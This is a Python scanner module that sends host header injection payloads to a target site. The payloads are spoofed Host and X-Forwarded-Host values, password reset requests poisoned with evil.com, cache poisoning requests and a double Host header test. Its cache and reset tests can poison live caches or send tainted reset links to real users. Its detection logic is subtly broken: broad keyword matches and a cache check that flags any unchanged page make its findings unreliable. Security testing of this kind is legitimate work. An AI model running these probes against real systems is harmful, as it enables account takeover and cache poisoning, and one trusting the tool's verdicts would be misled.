"""Deep host header injection detection — password reset poisoning, cache poisoning, SSRF, logging."""

import httpx
import re
import urllib.parse
import asyncio

# --- Host Header Injection Payloads ---
HOST_PAYLOADS = [
    ("evil.com", "External host injection"),
    ("localhost", "Localhost injection"),
    ("127.0.0.1", "Loopback IP injection"),
    ("0.0.0.0", "Zero address injection"),
    ("10.0.0.1", "Internal network injection"),
    ("192.168.1.1", "Private network injection"),
    ("172.16.0.1", "Private network injection (172.x)"),
    ("[::1]", "IPv6 loopback injection"),
    ("[0:0:0:0:0:0:0:1]", "IPv6 full loopback injection"),
    ("0x7f000001", "Hex IP injection"),
    ("2130706433", "Decimal IP injection"),
    ("127.0.0.1.nip.io", "Wildcard DNS injection"),
    ("evil.com%0d%0a", "CRLF injection via Host"),
    ("evil.com%0a", "LF injection via Host"),
    ("evil.com:443", "Port override injection"),
    ("evil.com:8080", "Port override injection (8080)"),
    ("evil.com\\@localhost", "Backslash user injection"),
    ("evil.com#@localhost", "Fragment injection"),
    ("evil.com?.localhost", "Query injection"),
    ("evil.com/.localhost", "Path injection"),
    ("0", "Zero host injection"),
    ("null", "Null host injection"),
    ("undefined", "Undefined host injection"),
    ("admin", "Admin host injection"),
    ("internal", "Internal host injection"),
    ("backend", "Backend host injection"),
    ("staging", "Staging host injection"),
    ("test", "Test host injection"),
    ("127.0.0.1\t", "Tab appended injection"),
    ("127.0.0.1 ", "Space appended injection"),
]

# --- Headers to Test ---
INJECT_HEADERS = [
    "Host",
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Server",
    "X-HTTP-Host-Override",
    "X-Real-IP",
    "Forwarded",
    "X-ProxyUser-IP",
]

# --- Password Reset Poisoning Indicators ---
RESET_INDICATORS = [
    "reset", "password", "link sent", "email sent", "verify",
    "token", "recovery", "forgot", "change password",
]

# --- Cache Poisoning Indicators ---
CACHE_INDICATORS = [
    "x-cache", "age", "cf-cache", "x-varnish", "via",
    "x-cdn", "x-fastly", "x-served-by", "x-cache-hits",
]

# --- SSRF Indicators ---
SSRF_INDICATORS = [
    "metadata", "instance", "ami-id", "ami-id",
    "local-ipv4", "public-ipv4", "instance-id",
    "169.254.169.254", "metadata.google.internal",
]

# --- Logging Poisoning Indicators ---
LOG_INDICATORS = [
    "access.log", "error.log", "log", "combined",
    "127.0.0.1 - -", "GET / HTTP/1.1",
]


def _detect_injection_evidence(body: str, headers: dict, host_value: str) -> dict:
    """Detect host header injection evidence."""
    evidence = {
        "host_reflected": False,
        "password_reset_page": False,
        "cache_poisoning": False,
        "ssrf_leak": False,
        "logging_poison": False,
        "different_content": False,
        "details": [],
    }

    # Host reflection
    if host_value in body:
        evidence["host_reflected"] = True
        evidence["details"].append(f"Host value '{host_value}' reflected in response")

    # Password reset page
    body_lower = body.lower()
    if any(ind in body_lower for ind in RESET_INDICATORS):
        evidence["password_reset_page"] = True
        evidence["details"].append("Password reset page detected — potential poisoning")

    # Cache poisoning indicators
    headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
    if any(ind in str(headers_lower) for ind in CACHE_INDICATORS):
        evidence["cache_poisoning"] = True
        evidence["details"].append("Cache headers present — potential cache poisoning")

    # SSRF leak
    if any(ind in body for ind in SSRF_INDICATORS):
        evidence["ssrf_leak"] = True
        evidence["details"].append("SSRF metadata leak detected")

    # Logging poisoning
    if any(ind in body_lower for ind in LOG_INDICATORS):
        evidence["logging_poison"] = True
        evidence["details"].append("Log data visible — potential log poisoning")

    return evidence


async def host_header(target: str) -> dict:
    """Deep host header injection detection with password reset poisoning, cache poisoning, SSRF, logging."""
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"

    results = []
    cache_analysis = {}
    header_analysis = {}

    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=False) as client:
        # --- Baseline ---
        try:
            baseline_resp = await client.get(target)
            baseline_status = baseline_resp.status_code
            baseline_size = len(baseline_resp.text)
            baseline_body = baseline_resp.text
        except Exception:
            return {"target": target, "error": "Failed to fetch baseline"}

        # --- Analyze cache headers ---
        cache_headers = {}
        for k, v in baseline_resp.headers.items():
            if "cache" in k.lower() or k.lower() in ["age", "via", "x-cache", "cf-cache"]:
                cache_headers[k] = v
        cache_analysis = {"headers": cache_headers, "cache_enabled": bool(cache_headers)}

        # --- Analyze security headers ---
        security_headers = {
            "X-Frame-Options": baseline_resp.headers.get("x-frame-options", ""),
            "X-Content-Type-Options": baseline_resp.headers.get("x-content-type-options", ""),
            "Strict-Transport-Security": baseline_resp.headers.get("strict-transport-security", ""),
            "Content-Security-Policy": baseline_resp.headers.get("content-security-policy", ""),
            "X-XSS-Protection": baseline_resp.headers.get("x-xss-protection", ""),
        }
        header_analysis = {k: bool(v) for k, v in security_headers.items()}

        # --- Test each injection ---
        for host_value, description in HOST_PAYLOADS:
            for header_name in ["Host", "X-Forwarded-Host"]:
                try:
                    headers = {header_name: host_value}
                    resp = await client.get(target, headers=headers)
                    body = resp.text

                    # Detect evidence
                    evidence = _detect_injection_evidence(body, dict(resp.headers), host_value)

                    # Compare with baseline
                    diff_status = resp.status_code != baseline_status
                    diff_size = abs(len(body) - baseline_size) > 50

                    suspicious = (
                        evidence["host_reflected"] or
                        evidence["ssrf_leak"] or
                        evidence["logging_poison"] or
                        diff_status or
                        diff_size
                    )

                    if suspicious:
                        risk = "CRITICAL"
                        if evidence["ssrf_leak"]:
                            risk = "CRITICAL"
                        elif evidence["host_reflected"]:
                            risk = "HIGH"
                        elif diff_status or diff_size:
                            risk = "MEDIUM"

                        results.append({
                            "technique": "host_header_injection",
                            "header": header_name,
                            "host_value": host_value,
                            "description": description,
                            "status": resp.status_code,
                            "diff_status": diff_status,
                            "diff_size": diff_size,
                            "evidence": evidence,
                            "risk": risk,
                            "confidence": "high" if evidence["host_reflected"] else "medium",
                        })
                        break  # Found on this host value, try next
                except Exception:
                    continue

        # --- Password Reset Poisoning Test ---
        reset_endpoints = [
            "/api/reset-password", "/api/forgot-password", "/api/password/reset",
            "/api/auth/reset", "/api/user/reset-password", "/reset-password",
            "/forgot-password", "/password/reset",
        ]

        for endpoint in reset_endpoints:
            try:
                reset_url = f"{base}{endpoint}"
                # Test with evil host
                headers = {"Host": "evil.com", "X-Forwarded-Host": "evil.com"}
                resp = await client.post(
                    reset_url,
                    json={"email": "test@evil.com"},
                    headers=headers,
                )

                if resp.status_code in (200, 201, 202):
                    body_lower = resp.text.lower()
                    if any(ind in body_lower for ind in RESET_INDICATORS):
                        results.append({
                            "technique": "password_reset_poisoning",
                            "endpoint": endpoint,
                            "host_value": "evil.com",
                            "status": resp.status_code,
                            "evidence": "Password reset with poisoned host — link may contain attacker URL",
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                        break
            except Exception:
                continue

        # --- Cache Poisoning Test ---
        if cache_analysis.get("cache_enabled"):
            for host_value in ["evil.com", "127.0.0.1"]:
                try:
                    headers = {"Host": host_value, "X-Forwarded-Host": host_value}
                    resp1 = await client.get(target, headers=headers)
                    # Second request to check if cached
                    resp2 = await client.get(target)

                    # Check if poisoned response is cached
                    if resp2.text == resp1.text and resp2.status_code == resp1.status_code:
                        results.append({
                            "technique": "cache_poisoning",
                            "host_value": host_value,
                            "status": resp2.status_code,
                            "evidence": "Cached response matches poisoned request",
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                        break
                except Exception:
                    continue

        # --- Double Host Header Test ---
        try:
            resp = await client.get(target, headers={
                "Host": f"{parsed.netloc}, evil.com",
                "X-Forwarded-Host": "evil.com",
            })
            if "evil.com" in resp.text:
                results.append({
                    "technique": "double_host_injection",
                    "status": resp.status_code,
                    "evidence": "Both hosts reflected — high confidence injection",
                    "risk": "CRITICAL",
                    "confidence": "confirmed",
                })
        except Exception:
            pass

    return {
        "target": target,
        "tests": results,
        "host_header_vulnerable": len(results) > 0,
        "total_findings": len(results),
        "cache_analysis": cache_analysis,
        "header_analysis": header_analysis,
        "techniques_found": list(set(r["technique"] for r in results)),
        "risk_summary": {
            "critical": sum(1 for r in results if r.get("risk") == "CRITICAL"),
            "high": sum(1 for r in results if r.get("risk") == "HIGH"),
            "medium": sum(1 for r in results if r.get("risk") == "MEDIUM"),
        },
    }
